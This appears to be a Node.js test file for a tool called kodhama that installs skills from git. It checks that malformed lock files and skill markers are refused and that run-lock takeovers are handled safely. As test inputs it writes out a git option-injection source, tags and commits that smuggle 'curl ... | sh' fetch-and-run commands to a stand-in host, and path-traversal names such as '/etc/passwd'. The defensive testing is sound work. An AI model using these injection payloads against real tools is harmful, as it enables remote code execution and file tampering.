// The lock is read back only when kodhama could have written it: a source
// git could read as an option, or a tool, skill or file name that would step
// out of its folder, makes the whole lock unreadable, so no verb acts on it.

import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import fs, { chmodSync, existsSync, mkdirSync, readFileSync, readdirSync, statSync, utimesSync, writeFileSync } from "node:fs";
import { syncBuiltinESMExports } from "node:module";
import { dirname, join } from "node:path";
import { test } from "node:test";

import { withTool } from "../src/fetch.mjs";
import { heldRunLocks, keepAlive } from "../src/lock.mjs";
import { places, recover, swapIn, withRunLock, writeMarker } from "../src/targets.mjs";
import { scratch, writeFiles } from "./helpers/scratch.mjs";

/**
 * A lock entry kodhama could have written, with `change` laid over it.
 * @param {Record<string, unknown>} change
 */
const entry = (change) => ({
  tag: "v0.1.0",
  commit: "0".repeat(40),
  source: "https://github.com/kodhama/demo.git",
  harnesses: ["claude", "codex"],
  skills: { alpha: { "SKILL.md": { sha256: "0".repeat(64), exec: false } } },
  ...change,
});

test("a lock whose source git could read as an option is refused, and git never runs it", (t) => {
  const machine = scratch(t);
  const repo = machine.project("work");
  const pwned = join(machine.root, "pwned");
  writeFiles(repo, {
    ".kodhama/cli/lock.json": `${JSON.stringify({ lock: 1, tools: { demo: entry({ source: `--upload-pack=touch ${pwned}` }) } })}\n`,
  });
  const before = machine.state();

  for (const verb of ["update", "remove"]) {
    const outcome = machine.kodhama([verb, "demo", "--scope", "project"], { cwd: repo });
    assert.equal(outcome.status, 1, verb);
    assert.match(outcome.stderr, /not a lock this kodhama can read/, verb);
  }
  assert.ok(!existsSync(pwned));
  assert.deepEqual(machine.state(), before);
});

test("fetch takes only an https:// or file:// source", (t) => {
  const machine = scratch(t);
  const pwned = join(machine.root, "pwned");

  const fetched = withTool("demo", undefined, { env: machine.env, tmp: machine.tmp, source: `--upload-pack=touch ${pwned}` }, () => "ran");

  assert.ok("error" in fetched);
  assert.match(fetched.error, /https:\/\/ or file:\/\//);
  assert.ok(!existsSync(pwned));
});

test("a lock with a tool, skill or file name that leaves its folder is refused, and nothing moves", (t) => {
  const machine = scratch(t);
  machine.fakeTool("demo", ["0.1.0", "0.2.0"]);
  // Something for each escape to reach, should it get through.
  mkdirSync(join(machine.claude, "x"));
  writeFiles(machine.claude, { "x/SKILL.md": "not a skill of demo's\n" });

  for (const tools of [
    { demo: entry({ skills: { "../x": { "SKILL.md": { sha256: "0".repeat(64), exec: false } } } }) },
    { "../demo": entry({}) },
    { demo: entry({ skills: { alpha: { "../../x/SKILL.md": { sha256: "0".repeat(64), exec: false } } } }) },
    { demo: entry({ skills: { alpha: { "/etc/passwd": { sha256: "0".repeat(64), exec: false } } } }) },
    { demo: entry({ skills: { alpha: { "a\\..\\b": { sha256: "0".repeat(64), exec: false } } } }) },
  ]) {
    writeFiles(machine.data, { "kodhama/lock.json": `${JSON.stringify({ lock: 1, tools })}\n` });
    const before = machine.state();
    for (const verb of ["remove", "update"]) {
      const outcome = machine.kodhama([verb, "demo"]);
      assert.equal(outcome.status, 1, `${verb} ${JSON.stringify(tools)}`);
      assert.match(outcome.stderr, /not a lock this kodhama can read/, verb);
    }
    assert.deepEqual(machine.state(), before, JSON.stringify(tools));
  }
});

test("a lock whose tag or commit is not one kodhama writes is refused, so neither reaches a printed command", (t) => {
  const machine = scratch(t);
  machine.fakeTool("demo", ["0.1.0"]);

  for (const change of [
    { tag: "v0.1.0 && curl -s https://evil.invalid/x | sh #" },
    { tag: "v0.1.0\nInstalled demo." },
    { commit: "0; curl -s https://evil.invalid/x | sh" },
  ]) {
    writeFiles(machine.data, { "kodhama/lock.json": `${JSON.stringify({ lock: 1, tools: { demo: entry(change) } })}\n` });
    for (const verb of ["install", "update", "remove"]) {
      const outcome = machine.kodhama([verb, "demo"]);
      assert.equal(outcome.status, 1, `${verb} ${JSON.stringify(change)}`);
      assert.match(outcome.stderr, /not a lock this kodhama can read/, verb);
      assert.ok(!outcome.stderr.includes("curl"), outcome.stderr);
    }
  }
});

test("a skill folder whose marker carries a tag or commit kodhama never writes is not the tool's, and its tag is never printed", (t) => {
  const machine = scratch(t);
  const tool = machine.fakeTool("demo", ["0.1.0", "0.2.0"]);
  assert.equal(machine.kodhama(["install", "demo#0.1.0"]).status, 0);

  for (const marker of [
    { tag: "v0.1.0 && curl -s https://evil.invalid/x | sh #", commit: tool.commit("v0.1.0") },
    { tag: "v0.1.0\nInstalled demo.", commit: tool.commit("v0.1.0") },
    { tag: "v0.2.0", commit: "0; curl -s https://evil.invalid/x | sh" },
  ]) {
    const alpha = join(machine.claudeSkills, "alpha");
    writeFiles(alpha, { ".kodhama-skill.json": `${JSON.stringify({ tool: "demo", skill: "alpha", ...marker })}\n` });
    const before = machine.state();
    for (const args of [["update", "demo"], ["install", "demo"], ["install", "demo", "--harness", "claude"]]) {
      const outcome = machine.kodhama(args);
      assert.equal(outcome.status, 1, `${args.join(" ")} ${JSON.stringify(marker)}`);
      assert.ok(!outcome.stderr.includes("curl") && !outcome.stderr.includes("Installed demo."), outcome.stderr);
      assert.ok(!outcome.stderr.includes("Finish that update"), outcome.stderr);
      assert.deepEqual(machine.state(), before, args.join(" "));
    }
  }
  // remove leaves the folder alone, naming it, and never echoes its tag.
  const removed = machine.kodhama(["remove", "demo"]);
  assert.ok(!`${removed.stdout}${removed.stderr}`.includes("curl"), removed.stdout);
  assert.ok(removed.stdout.includes(`Left ${join(machine.claudeSkills, "alpha")} alone`), removed.stdout);
  assert.ok(existsSync(join(machine.claudeSkills, "alpha")));
});

test("a run lock whose token is no longer ours survives our release", (t) => {
  const machine = scratch(t);
  const path = join(machine.data, "kodhama", "run.lock");

  withRunLock(path, () => writeFileSync(join(path, "owner"), "another run\n"));

  assert.ok(existsSync(join(path, "owner")));
});

test("a claimant that renamed aside a lock another run had just taken over puts it back and backs off", (t) => {
  const machine = scratch(t);
  const path = join(machine.data, "kodhama", "run.lock");
  mkdirSync(path, { recursive: true });
  writeFileSync(join(path, "owner"), "a run that died\n");
  const old = new Date(Date.now() - 60 * 60 * 1000);
  utimesSync(path, old, old);
  // Between this claimant reading the stale token and renaming the lock
  // aside, another run takes it over and writes its own token.
  const { renameSync } = fs;
  fs.renameSync = (from, to) => {
    if (from === path && String(to).includes(".stale-")) writeFileSync(join(path, "owner"), "the run that took over\n");
    return renameSync(from, to);
  };
  syncBuiltinESMExports();
  let ran = false;
  let outcome;
  try {
    outcome = withRunLock(path, () => {
      ran = true;
    });
  } finally {
    fs.renameSync = renameSync;
    syncBuiltinESMExports();
  }

  assert.equal(ran, false);
  assert.equal(/** @type {any} */ (outcome).code, 1);
  assert.equal(readFileSync(join(path, "owner"), "utf8"), "the run that took over\n");
  assert.deepEqual(readdirSync(dirname(path)).filter((name) => name.includes(".stale-")), []);
});

test("a held run lock is refreshed before each phase, so a long run never looks stale", (t) => {
  const machine = scratch(t);
  const path = join(machine.data, "kodhama", "run.lock");
  const old = new Date(Date.now() - 60 * 60 * 1000);

  const refreshed = withRunLock(path, () => {
    utimesSync(path, old, old);
    keepAlive();
    return statSync(path).mtimeMs;
  });

  assert.ok(Date.now() - /** @type {number} */ (refreshed) < 60 * 1000);
  assert.ok(!existsSync(path));
});

/**
 * Effect: a folder holding a `git` that, for each step whose name is among
 * its arguments, first runs that step's shell hook, then the real git.
 * Returns the PATH that puts it first.
 * @param {ReturnType<typeof scratch>} machine
 * @param {Readonly<Record<string, string>>} hooks
 */
const gitWith = (machine, hooks) => {
  const real = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
  const dir = join(machine.root, "hooked-git");
  const cases = Object.entries(hooks).map(([step, hook]) => `case " $* " in *" ${step} "*) ${hook} ;; esac\n`);
  writeFiles(dir, { git: `#!/bin/sh\n${cases.join("")}exec "${real}" "$@"\n` });
  chmodSync(join(dir, "git"), 0o755);
  return { PATH: `${dir}:${machine.env.PATH}` };
};

test("the run lock is refreshed between the fetch's git calls, so a slow fetch never looks stale", (t) => {
  const machine = scratch(t);
  machine.fakeTool("demo", ["0.1.0"]);
  const held = join(machine.data, "kodhama", "run.lock");
  const recent = join(machine.root, "ten-minutes-ago");
  writeFileSync(recent, "");
  const then = new Date(Date.now() - 10 * 60 * 1000);
  utimesSync(recent, then, then);
  const seen = join(machine.root, "seen");
  // fetch ages the lock past stale; checkout, the next git call, records
  // whether it was refreshed in between.
  const path = gitWith(machine, {
    fetch: `touch -t 200001010000 "${held}"`,
    checkout: `if [ "${held}" -nt "${recent}" ]; then echo fresh > "${seen}"; else echo stale > "${seen}"; fi`,
  });

  const outcome = machine.kodhama(["install", "demo"], { env: path });

  assert.equal(outcome.status, 0, outcome.stderr);
  assert.equal(readFileSync(seen, "utf8"), "fresh\n");
});

test("a run whose lock another run took over during the fetch stops before it swaps or writes the lock", (t) => {
  const machine = scratch(t);
  machine.fakeTool("demo", ["0.1.0"]);
  const held = join(machine.data, "kodhama", "run.lock");
  // The last git call of the fetch: the lock now names another run.
  const path = gitWith(machine, { "rev-parse": `printf 'another run\\n' > "${held}/owner"` });

  const outcome = machine.kodhama(["install", "demo"], { env: path });

  assert.equal(outcome.status, 1, outcome.stdout);
  assert.match(outcome.stderr, /took over/);
  assert.ok(outcome.stderr.includes(held), outcome.stderr);
  assert.ok(!existsSync(machine.claudeSkills));
  assert.ok(!existsSync(machine.codexSkills));
  assert.ok(!existsSync(machine.lock));
  assert.equal(readFileSync(join(held, "owner"), "utf8"), "another run\n");
});

/**
 * Effect: installs demo for Claude, hand-edits alpha, and starts a swap of
 * alpha under the user-scope run lock. Right after the new copy is renamed
 * into place, with the hand-edited copy still in the stage as `alpha.old`,
 * another run takes the run lock over and runs recovery, which moves that
 * copy to prev/. `stale` decides what that run sees: with `refreshed`, the
 * lock looked stale when it checked, but its owner refreshed it before the
 * rename aside. The other run is another process, so it holds none of this
 * one's run locks. Returns the swapping run's outcome, the other run's, and
 * the prev/ slot.
 * @param {import("node:test").TestContext} t
 * @param {{ readonly refreshed: boolean }} stale
 */
const takenOverMidSwap = (t, { refreshed }) => {
  const machine = scratch(t);
  machine.fakeTool("demo", ["0.1.0"]);
  assert.equal(machine.kodhama(["install", "demo", "--harness", "claude"]).status, 0);
  writeFileSync(join(machine.claudeSkills, "alpha", "SKILL.md"), "alpha edit\n");
  const where = places("user", machine.env, undefined);
  const skills = where.skills("claude");
  const live = join(skills, "alpha");
  const prev = where.prev("claude", "alpha");
  const { renameSync, statSync } = fs;
  /** @type {unknown} */
  let other;

  const contend = () => {
    const ours = new Map(heldRunLocks);
    heldRunLocks.clear();
    // This run was suspended past the lease, so its lock looks stale.
    const old = new Date(Date.now() - 60 * 60 * 1000);
    utimesSync(join(where.runLock, "owner"), old, old);
    utimesSync(where.runLock, old, old);
    if (refreshed) {
      // Just after the other run reads the lock's age, this run wakes and
      // refreshes it, as it does before each phase.
      fs.statSync = /** @type {typeof fs.statSync} */ ((/** @type {any} */ path, /** @type {any} */ ...rest) => {
        const stat = statSync(path, ...rest);
        if (path === where.runLock) {
          fs.statSync = statSync;
          syncBuiltinESMExports();
          for (const [held, token] of ours) heldRunLocks.set(held, token);
          keepAlive();
          heldRunLocks.clear();
        }
        return stat;
      });
      syncBuiltinESMExports();
    }
    try {
      other = withRunLock(where.runLock, () => recover(skills, "claude", (skill) => where.prev("claude", skill)));
    } finally {
      fs.statSync = statSync;
      syncBuiltinESMExports();
      heldRunLocks.clear();
      for (const [held, token] of ours) heldRunLocks.set(held, token);
    }
  };
  fs.renameSync = (from, to) => {
    renameSync(from, to);
    if (to === live) {
      fs.renameSync = renameSync;
      syncBuiltinESMExports();
      contend();
    }
  };
  syncBuiltinESMExports();
  /** @type {unknown} */
  let swapping;
  try {
    swapping = withRunLock(where.runLock, () =>
      swapIn(skills, "claude", "alpha", (dir) => {
        writeFiles(dir, { "SKILL.md": "Alpha new.\n" });
        writeMarker(dir, { tool: "demo", skill: "alpha", tag: "v0.1.0", commit: "0".repeat(40) });
      }, prev),
    );
  } catch (error) {
    swapping = error;
  } finally {
    fs.renameSync = renameSync;
    fs.statSync = statSync;
    syncBuiltinESMExports();
  }
  return { swapping, other, prev };
};

test("a run that finds the run lock refreshed after it judged it stale puts it back and backs off, and the swap keeps the hand edit in prev/", (t) => {
  const { swapping, other, prev } = takenOverMidSwap(t, { refreshed: true });

  assert.equal(/** @type {any} */ (other)?.code, 1, String(other));
  assert.ok(!(swapping instanceof Error), String(swapping));
  assert.equal(readFileSync(join(prev, "SKILL.md"), "utf8"), "alpha edit\n");
});

test("a run whose run lock is taken over mid-swap stops before it touches prev/, and the hand-edited copy stays there", (t) => {
  const { swapping, other, prev } = takenOverMidSwap(t, { refreshed: false });

  assert.ok(Array.isArray(other), `the other run took the lock and recovered: ${JSON.stringify(other)}`);
  assert.ok(swapping instanceof Error, String(swapping));
  assert.match(swapping.message, /took over/);
  assert.equal(readFileSync(join(prev, "SKILL.md"), "utf8"), "alpha edit\n");
});
